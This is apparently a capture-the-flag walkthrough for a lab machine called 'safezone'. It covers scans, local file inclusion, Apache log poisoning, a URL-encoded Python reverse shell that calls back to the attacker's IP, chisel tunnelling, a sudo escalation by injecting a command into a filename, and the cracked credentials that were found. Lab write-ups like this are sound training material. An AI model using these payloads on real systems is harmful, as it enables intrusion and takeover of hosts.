
First scan:
```
nmap -A -sV $IP | tee scan.txt

┌─[root@edu-virtualbox]─[/home/edu/THM/safezone]
└──╼ #cat scan.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-02 18:53 CET
Nmap scan report for 10.10.241.1
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Whoami?
|_http-server-header: Apache/2.4.29 (Ubuntu)

```


Major gobuster scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/safezone]
└──╼ #gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.241.1 -x .html,.php,.bak | tee gobuster_scan 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,bak
[+] Timeout:                 10s
===============================================================
2023/01/02 18:55:05 Starting gobuster in directory enumeration mode
===============================================================
/news.php             (Status: 302) [Size: 922] [--> index.php]
/index.php            (Status: 200) [Size: 2372]               
/index.html           (Status: 200) [Size: 503]                
/register.php         (Status: 200) [Size: 2334]               
/detail.php           (Status: 302) [Size: 1103] [--> index.php]
/logout.php           (Status: 200) [Size: 54]                  
/dashboard.php        (Status: 302) [Size: 922] [--> index.php] 
/server-status        (Status: 403) [Size: 276]               
===============================================================
2023/01/02 19:32:38 Finished
===============================================================
```

Registered user, found hint on `http://$IP/detail.php`:
```
<!-- Try using "page" as a GET parameter. -->
```

I noticed that my login name was being reflected:
```
<h2>welcome Edu!</h2>
```

Found `/note.txt`:
```
Message from admin :-
		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```

Found `/~files/` with a bigger wordlist using Gobuster.
```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```
Password: `admin44admin`

As admin, use ```
```
http://$IP/detail.php?page=PATH_TO_FILE
```
to view the contents of the file.
Use base64-encode to view PHP files (also confirms it's using PHP, may be vulnerable to log poisoning)
```
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

Log file found:
```
http://$IP/detail.php?page=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log
```

Using log poisoning with the XXX payload, it worked:
```
http://10.10.184.154/detail.php?page=/var/log/apache2/access.log&sus=ls%20-la%20/
```

Got the reverse shell:
```
http://10.10.122.114/detail.php?page=/var/log/apache2/access.log&rce=export%20RHOST=%2210.8.1.167%22;export%20RPORT=5555;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22/bin/bash%22)%27
```


Found hash in `files` home:
```
files:$6$BUr7qnR3$v63gy9xLoNzmUC1dNRF3GWxgexFs7Bdaa2LlqIHPvjuzr6CgKfTij/UVqOcawG/eTxOQ.UralcDBS0imrvVbc.
```
Password: `magic`


Something's going on at `127.0.0.1:8000`, maybe `yash`-hosted site?

Hint: `ls -la /`, any directories that catch my eye?


Used port tunelling:
```
./chisel_linux client 10.8.1.167:5000 R:8000:127.0.0.1:8000
chisel server -p 5000 --reverse
```

Found the `/login.html` page
Found in source:
```
<script src="login.js"></script>
```

Leads to:
```
var attempt = 3;
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "user" && password == "pass"){
alert ("Login successfully");
window.location = "pentest.php";
return false;
}
else{
attempt --;
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```


Uploaded SSH key to `yash` user
Tried sudo -l:
```
yash@safezone:/tmp$ sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py

```

```
yash@safezone:/tmp$ sudo /usr/bin/python3 /root/bk.py             
Enter filename: a;chown -R yash /root                                               
Enter destination:                                                                  
Enter Password:                                                                                                                                                         
```

And I got the flag :)

### Found credentials
- Admin login (web portal): `admin:admin44admin`
- MySQL login: `"localhost","root","myrootpass","db"`
- "Files" user login: `files:magic`

